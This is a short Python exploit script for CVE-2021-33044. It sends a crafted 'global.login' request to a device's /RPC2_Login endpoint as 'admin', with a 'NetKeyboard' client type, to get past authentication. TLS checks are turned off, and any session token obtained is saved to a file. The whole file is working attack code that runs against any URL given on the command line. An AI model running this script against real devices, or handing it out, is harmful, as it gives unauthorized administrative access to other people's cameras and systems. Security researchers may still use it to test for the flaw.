import requests
import sys
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#coded by @D0rkerDevil
target = sys.argv[1]
url = target+"/RPC2_Login"
headerss = {
    "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": target+"/", "Referer": target+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
post_json={
    "id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0
    }
r = requests.post(url, headers=headerss, json=post_json, verify=False)
print (r.content)
if 'true' in str(r.content):
    print ("vulnerable to CVE-2021-33044")
    with open('vulnerable.txt', 'w')as f:
        f.write(url)
        f.write('\n')
        f.write(str(r.content))
        f.close()
        print ("session token saved to vulnerable.txt")
else:
    print ("Not Vulnerable!!!")
